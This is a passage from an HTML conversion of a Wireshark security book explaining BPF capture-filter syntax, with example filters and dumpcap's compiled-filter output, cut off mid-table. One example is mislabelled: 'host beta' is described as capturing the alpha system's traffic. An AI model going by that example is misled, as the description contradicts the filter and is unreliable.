Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker44848.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >portrange</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section30" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Direction can be set using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >src </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dst</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. As you suspect, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >src </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is for capturing from a specified source address, while </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dst </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >can specify the destination address. If it is not specified, both will be matched. In addition to specifying one direction, the following combined direction modifiers can be used: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >src or dst </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >src and</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dst</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In a similar way, if a type is not specified, a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >host</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >type will be assumed. Note that you need to specify at least one object to compare to; the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >host </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >modifier will not be assumed if you would only specify an IP address as filter and will result in a syntax error.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The direction and protocol can be omitted to match a type in both source and destination across all protocols. For example, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dst host 192.168.1.1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >would only show traffic going to the specified IP. If </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dst</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is omitted, it would show traffic to and from that IP address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following are the most commonly used BPF protocols:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker45772.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ether</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(filtering Ethernet protocols)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:285.8500pt;margin-left:30.5000pt;line-height:142%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.3333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker45810.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:64.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker45811.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:105.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker45812.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:147.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker45813.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;letter-spacing:-4.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(filtering TCP traffic) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >ip </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(filtering IP traffic) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >ip6</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;letter-spacing:-4.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(filtering IPv6 traffic) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >arp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;letter-spacing:-4.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(filtering ARP traffic)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In addition to the standard components, there is a set of </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >primitives</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></p><p class=MsoBodyText  style="margin-top:0.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that do not fit in one of the categories:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46036.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gateway</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(matches if a packet used the specified host as gateway)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:157.5000pt;margin-left:30.5000pt;line-height:142%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.3333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46102.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:64.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46103.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:105.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46104.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >broadcast</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;letter-spacing:-5.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(for broadcast, not unicast, traffic) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >less<a name="_bookmark33" ></a>&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(less than, followed by a length) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;font-size:12.0000pt;" >greater</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:142%;letter-spacing:-4.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(greater than, followed by a length)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >These primitives can be combined with the other components. For example, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ether broadcast</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >will match all Ethernet broadcast traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capture filter expressions can be strung together using logical operators. Again, with both the English and the logical notation:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46499.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >and</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&&</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section31" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:17.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46510.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >or</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >||</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.3500pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46519.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >not</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For example, here are some filters for systems named alpha and beta:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46597.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >host beta</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(captures all packets to and from the alpha system)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.5500pt;margin-right:11.1500pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.3333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46660.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip6 host alpha and not beta</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(captures all IP packets between alpha and any host except beta)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.8000pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:24.0000px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker46754.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp port 80</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(captures all TCP traffic across port 80)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.6000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Debugging Capture Filters</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capture filters operate on a low level of the captured network data. They are compiled to processor opcodes (processor language) in order to ensure high performance. The compiled BPF can be shown by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-d </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >operator on tcpdump, Dumpcap, or TShark, and in the Capture Options menu in the GUI.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;margin-right:10.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is useful when debugging a problem where your filter is not</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >doing exactly what you were expecting. The following is an example output of a BPF</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >filter:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ dumpcap -f "ether host 00:01:02:03:04:05" -d Capturing on 'eth0'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:321.7500pt;margin-left:11.2500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(000)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >ld</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[8]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=184  valign=top  colspan=4  style="width:110.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=70  valign=top  style="width:42.1000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.5000pt;margin-left:1.5000pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >(001)</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=84  valign=top  style="width:50.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jeq</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=197  valign=top  style="width:118.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:25.1000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >#0x2030405</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=66  valign=top  style="width:39.6000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.6000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >jt</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=42  valign=top  style="width:25.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.4500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >2</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 